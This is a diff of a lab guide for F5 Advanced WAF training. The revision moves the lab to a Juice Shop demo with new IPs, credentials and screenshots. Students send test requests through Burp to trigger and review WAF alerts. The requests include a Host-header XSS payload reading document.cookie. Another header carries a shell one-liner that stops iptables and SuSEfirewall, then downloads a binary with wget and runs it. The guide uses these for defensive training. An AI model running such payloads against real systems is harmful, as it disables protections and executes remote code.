@@ -239,7 +239,7 @@ In this section we are going to use the free/community version of an excellent D
 
 ### Accept the Remaining Learning Suggestions
 Go to **Security > Application Security > Policy Building > Traffic Learning** and select all of the remaining suggestions and click **Accept > Accept suggestions** and then **Apply Policy**.
-![image](https://user-images.githubusercontent.com/38420010/119370128-3ccb7000-bcb5-11eb-886a-9b2c805a0528.png)
+![image](https://user-images.githubusercontent.com/51786870/210516002-469b26b5-1f07-46a6-92ef-8af052c88dea.png)
 
 ### HTTP Compliancy Check - Bad Host Header Value
 The **Bad Host Header Value** check is an HTTP Parser Attack and definitely something that should be implemented as part of **Good WAF Security**. It was included in the suggestions you just accepted.
@@ -247,30 +247,33 @@ The **Bad Host Header Value** check is an HTTP Parser Attack and definitely some
 **Risk**: If we allow bad host header values they can be used to Fuzz web servers and gather system information. Successful exploitation of this attack could allow for the execution of XSS arbitrary code.
 
 1. Launch **Burp** from the Desktop. **Do Not click multiple times. It takes a few moments to load**.
-![image](https://user-images.githubusercontent.com/38420010/119370368-7b612a80-bcb5-11eb-9e0a-9578472456e4.png)
+![image](https://user-images.githubusercontent.com/51786870/210516327-76bfb7ad-7b47-47c2-8c14-f7a7d46b3287.png)
 2. **DO NOT update.**
 3. Choose **Temporary Project** and click **Next** and then click **Start Burp**.
+
+![image](https://user-images.githubusercontent.com/51786870/210516409-60b4e392-048e-4395-af3f-9adba0e6d361.png)
+
 4. Click the **Repeater** tab and paste in the following http request (Replace the username and password with credentials you have created.) and click **Send**.
-5. A popup window will appear to configure the target details. For host use: **10.1.10.145**. For port use: **443**. **Check the Use HTTPS box**.
+5. A popup window will appear to configure the target details. For host use: **10.1.10.58**. For port use: **80**. **Do not check the Use HTTPS box**.
 6. Click **Send**
 **XSS in HOST Header**  
 
 ```
-POST https://10.1.10.145/WebGoat/login HTTP/1.1
-User-Agent: BabyYoda
+POST https://10.1.10.58/#/login HTTP/1.1
+User-Agent: BestBrowser
 Pragma: no-cache
 Cache-Control: no-cache
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 38
+Content-Length: 44
 Host: <script>alert(document.cookie);</script>
 
-username=f5student&password=[password]
+username=student@f5demo.com&password=student
 ```
 
-![image](https://user-images.githubusercontent.com/38420010/119371000-3ee1fe80-bcb6-11eb-9028-904c31ef3a4f.png)
+![image](https://user-images.githubusercontent.com/51786870/210516998-8b436fc6-da42-4043-8a99-6d5053e8f337.png)
 7. Back in Advanced WAF, browse to **Security > Event Logs > Application > Requests** and review the alert for this Sev5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring including HTTP protocol Violations and several XSS signatures.
 8. Review all the details and then click the 3 under the **Attack Signature Detected** violation to see all of the staged XSS Attack Signatures that were triggered.
-![image](https://user-images.githubusercontent.com/38420010/119371172-6fc23380-bcb6-11eb-8c36-29d482684897.png)
+![image](https://user-images.githubusercontent.com/51786870/210517143-d77e7f19-9997-4cd0-b4a9-ce0ce56fb449.png)
 
 ### Server Technologies & Attack Signatures
 In this final exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known or communicated from the Dev team.
@@ -278,12 +281,17 @@ In this final exercise we will examine server technologies which allow you to au
 1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures**
 2. Review the Attack Signatures that were applied during policy creation from back in Lab 1. **Generic Detection Signatures (High/Medium Accuracy)**. Notice that they are set to **Learn/Alarm/Block** and **Staging** is enabled.
 3. Locate Server Technologies and expand the option. Click **Enable Server Technology Detection**, click **Save** and then click the **New Window Icon** next to Server Technologies.
-![image](https://user-images.githubusercontent.com/38420010/119371333-997b5a80-bcb6-11eb-9072-b1a7a38b73e5.png)
+![image](https://user-images.githubusercontent.com/51786870/210517472-f3b74877-9882-46ff-9a50-d627394e036c.png)
 4. Scroll down to Advanced Settings > Server Technologies and click in the box. Search for Linux since we know the server is running Linux. The system will display a box describing which new signature sets will be applied. Click Confirm.
-5. Make sure to **Save** and **Apply Policy**.
-6. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the new Unix/Linux Server Technology signature sets that were added to the policy.
 
-![image](https://user-images.githubusercontent.com/38420010/119371527-d21b3400-bcb6-11eb-8cc0-b09e24f21c99.png)
+![image](https://user-images.githubusercontent.com/51786870/210517725-420aff8b-5893-4d5f-936a-db18a859ad4b.png)
+
+![image](https://user-images.githubusercontent.com/51786870/210517785-9a193b58-5658-4448-8591-26d4594fa843.png)
+
+6. Make sure to **Save** and **Apply Policy**.
+7. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the new Unix/Linux Server Technology signature sets that were added to the policy.
+
+![image](https://user-images.githubusercontent.com/51786870/210517924-850e02b9-1d07-4d98-a7b1-997e4dfc4362.png)
 
 ### Framework Attacks
 
@@ -291,27 +299,33 @@ In this final exercise we will examine server technologies which allow you to au
 
 **Framework Attack**
 ```
-POST https://10.1.10.145/WebGoat/login HTTP/1.1
-User-Agent: ImperialProbeDroid
+POST https://10.1.10.57/#/login HTTP/1.1
+User-Agent: BestBrowser
 Pragma: no-cache
 Cache-Control: no-cache
 Content-Type: /etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; cd /tmp; wget -c https://10.1.10.145:443/7; chmod 777 7; ./7;
-Content-Length: 38
-Host: DarthMaul
+Content-Length: 44
+Host: juiceshop.f5demo.com
 
-username=f5student&password=[password]
+username=student@f5demo.com&password=student
 ```
+
+![image](https://user-images.githubusercontent.com/51786870/210518168-1db7f73d-118c-41a2-8d24-9ba6360a80a8.png)
+
 
 2. Browse to **Security > Event Logs > Application > Requests** and look for the most recent Sev5 Event. Select the event, review the violations and click the 2 under Occurrences for the Attack signature detected violation.
 
+![image](https://user-images.githubusercontent.com/51786870/210518293-2c1ce688-5905-4d25-b737-7638fdc3f0f4.png)
+
+
 3. Click the little blue i and review the Attack Signature Details. We can see that this was a Systems based Unix/Linux Signature in staging mode.
-![image](https://user-images.githubusercontent.com/38420010/119372077-3fc76000-bcb7-11eb-8838-a2d9f448fb81.png)
+![image](https://user-images.githubusercontent.com/51786870/210518444-c44a12c2-b2b2-4078-a887-9d84f13dc9b6.png)
 
 4. We are now alerting on attacks aimed at Server Technologies.
 
-**This completes Lab 4**
+**This completes Module 1**
 
-**Congratulations! It was a long road but you made it though and now have the knowledge to go forth and start testing. Given the Advanced WAF is a proxy, you could build a Virtual Edition F5 locally on your machine and implement a number of test scenarios with no impacts to a production application. Contact your friendly neighborhood F5 Solutions Engineer for more information!! Hope to see you in the 241 Elevated WAF Protection class! Cheers!!!**
+
 
 
 #
@@ -606,7 +620,7 @@ These steps are necessary for this demonstration. In the “real world” having
 
 
 
-
+**Congratulations! It was a long road but you made it though and now have the knowledge to go forth and start testing. Given the Advanced WAF is a proxy, you could build a Virtual Edition F5 locally on your machine and implement a number of test scenarios with no impacts to a production application. Contact your friendly neighborhood F5 Solutions Engineer for more information!! Hope to see you in the 241 Elevated WAF Protection class! Cheers!!!**
 
 
 
